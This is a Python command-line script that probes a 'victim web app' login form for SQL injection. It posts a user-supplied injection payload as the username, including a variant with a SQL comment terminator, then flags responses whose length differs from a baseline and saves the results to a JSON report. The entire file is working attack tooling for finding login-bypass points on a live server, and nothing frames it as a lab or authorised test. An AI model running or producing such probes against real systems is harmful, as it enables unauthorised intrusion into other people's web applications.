"""Fingerprint SQL injection entry points in the victim web app."""
from __future__ import annotations

import argparse
import json
from dataclasses import dataclass, asdict
from typing import Iterable, List

import requests


@dataclass
class ProbeResult:
    url: str
    payload: str
    status_code: int
    content_length: int
    is_different: bool


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="HTTP endpoint to test")
    parser.add_argument("--payload", required=True, help="SQLi payload to inject")
    parser.add_argument("--report", required=True, help="Where to store JSON report")
    parser.add_argument(
        "--baseline",
        default="baseline",
        help="Baseline string for comparison",
    )
    return parser


def send_request(url: str, username: str, password: str) -> requests.Response:
    return requests.post(url, data={"username": username, "password": password}, timeout=5)


def analyze(url: str, payload: str, baseline: str) -> List[ProbeResult]:
    results: List[ProbeResult] = []
    baseline_resp = send_request(url, baseline, baseline)
    baseline_length = len(baseline_resp.text)

    tests = [
        (payload, baseline),
        (payload, "anything"),
        (f"{payload} -- ", ""),
    ]
    for candidate_user, candidate_pass in tests:
        response = send_request(url, candidate_user, candidate_pass)
        results.append(
            ProbeResult(
                url=url,
                payload=candidate_user,
                status_code=response.status_code,
                content_length=len(response.text),
                is_different=len(response.text) != baseline_length,
            )
        )
    return results


def run_probe(args: argparse.Namespace) -> None:
    results = analyze(args.url, args.payload, args.baseline)
    with open(args.report, "w", encoding="utf-8") as handle:
        json.dump([asdict(result) for result in results], handle, indent=2)
    for result in results:
        marker = "[+]" if result.is_different else "[ ]"
        print(f"{marker} payload={result.payload} status={result.status_code} length={result.content_length}")


def main(argv: Iterable[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(list(argv) if argv is not None else None)
    run_probe(args)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
